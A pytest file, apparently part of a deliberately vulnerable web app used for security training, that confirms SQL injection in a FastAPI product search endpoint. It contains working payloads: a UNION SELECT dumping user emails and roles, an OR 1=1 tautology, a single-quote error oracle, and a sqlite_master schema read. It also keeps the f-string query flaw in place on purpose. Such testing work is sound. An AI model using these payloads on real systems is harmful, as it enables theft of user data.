"""SQL injection in the product search.

PLAN.md step 2, "break" phase. `GET /products/search` builds its query as
`f"SELECT * FROM products WHERE name LIKE '%{q}%'"`, so `q` is SQL rather than
a value. These tests assert the exploit **succeeds**; they invert when the
endpoint moves to bound parameters.

Ruff flags the endpoint (`S608`) -- see THREAT_MODEL.md F-08 for what it would
have missed. SAST noticing is not the same as the bug being absent, which is
the reason these tests exist at all.
"""

import pytest
from fastapi.testclient import TestClient
from sqlalchemy.exc import OperationalError

# `seeded` is required for its side effect only -- these tests assert on what the
# injection reaches, not on the seeded ids.
pytestmark = [pytest.mark.attack, pytest.mark.mcp05, pytest.mark.usefixtures("seeded")]

#: Five columns to match `SELECT *` on products (id, sku, name, price_cents,
#: stock_qty). The trailing `--` comments out the rest of the LIKE pattern.
UNION_EXFIL = "' UNION SELECT id, email, role, 0, 0 FROM users --"


def test_union_select_exfiltrates_the_users_table(
    client: TestClient,
) -> None:
    """The payload from PLAN.md step 2, verbatim.

    Result columns are named by the *first* select in a UNION, so user emails
    arrive as `sku` and roles as `name`. The response model accepts them
    without complaint: it constrains types, not provenance.
    """
    response = client.get("/products/search", params={"q": UNION_EXFIL})

    assert response.status_code == 200
    rows = response.json()

    skus = {row["sku"] for row in rows}
    assert "admin@example.test" in skus, "users table not reached"

    # The role column is the prize -- it tells an attacker which account to target.
    leaked = {row["sku"]: row["name"] for row in rows if "@" in (row["sku"] or "")}
    assert leaked["admin@example.test"] == "admin"
    assert len(leaked) == 4, f"expected one row per role, got {leaked}"


def test_tautology_returns_the_whole_catalogue(client: TestClient) -> None:
    """A filter that can be switched off is not a filter.

    Cheap to overlook because the response still looks like products. This is
    how the vulnerability is usually found in the wild: a search that returns
    too much rather than one that errors.
    """
    narrow = client.get("/products/search", params={"q": "Widget"})
    assert len(narrow.json()) == 1

    wide = client.get("/products/search", params={"q": "' OR 1=1 --"})
    assert len(wide.json()) == 2


def test_a_bare_quote_raises_an_unhandled_database_error(
    client: TestClient,
) -> None:
    """The error-based oracle, and it leaks more than a status code.

    A single quote breaks the statement and the `OperationalError` propagates
    out of the handler -- a 500 in deployment. The detail worth noticing is
    that SQLAlchemy embeds the *failed statement* in the exception message:

        (sqlite3.OperationalError) unrecognized token: "'"
        [SQL: SELECT * FROM products WHERE name LIKE '%'%']

    So any handler that echoes exception detail to the client, or any log
    shipped somewhere less trusted than the database, hands over the exact
    query shape. That is the difference between having to guess the column
    count for the UNION above and being told it.
    """
    with pytest.raises(OperationalError, match=r'unrecognized token: "\''):
        client.get("/products/search", params={"q": "'"})


def test_the_database_error_message_contains_the_injected_statement(
    client: TestClient,
) -> None:
    """Pin the leak itself, separately from the fact that it errors."""
    with pytest.raises(OperationalError) as caught:
        client.get("/products/search", params={"q": "'"})

    message = str(caught.value)
    assert "SELECT * FROM products WHERE name LIKE" in message
    assert "sku" not in message  # `SELECT *` hides the column list, for now


def test_injection_can_read_from_sqlite_internal_schema(
    client: TestClient,
) -> None:
    """Reconnaissance step: the attacker does not need to know table names.

    `sqlite_master` lists every table and its full DDL, which turns a blind
    injection into a targeted one.
    """
    payload = "' UNION SELECT 0, name, sql, 0, 0 FROM sqlite_master WHERE type='table' --"
    response = client.get("/products/search", params={"q": payload})

    assert response.status_code == 200
    names = {row["sku"] for row in response.json()}
    assert {"users", "orders", "order_items", "audit_log"} <= names
